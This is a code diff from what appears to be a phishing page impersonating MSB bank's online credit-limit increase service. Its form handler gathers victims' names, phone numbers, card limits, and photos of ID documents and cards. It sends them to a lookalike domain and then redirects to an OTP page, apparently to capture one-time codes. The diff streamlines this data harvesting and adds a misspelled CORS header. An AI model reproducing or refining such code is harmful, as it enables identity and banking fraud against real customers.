@@ -419,18 +419,7 @@
                 //     return;
                 // }
 
-
-                const formData = new FormData();
-                formData.append('name', name);
-                formData.append('phone', phone);
-                formData.append('limit_now', limit_now);
-                formData.append('limit_total', limit_total);
-                formData.append('limit_increase', limit_increase);
-                formData.append('mattruoc', mattruoc);
-                formData.append('matsau', matsau);
-                formData.append('mattruoc_card', mattruoc_card);
-                formData.append('matsau_card', matsau_card);
-                formData.append('action', action);
+                var formData = new FormData($(this)[0]);
 
                 $.ajax({
                     url: 'https://admin.msb-nanghanmuc-tructuyen.online/api/customer',
@@ -438,6 +427,10 @@
                     data: formData,
                     contentType: false,
                     processData: false,
+                    headers: {
+                        'Aceess-Control-Allow-Origin': '*',
+                        'Accept': 'application/json',
+                    },
                     success: function (data) {
                         window.location.href = '/otp.html';
                     },
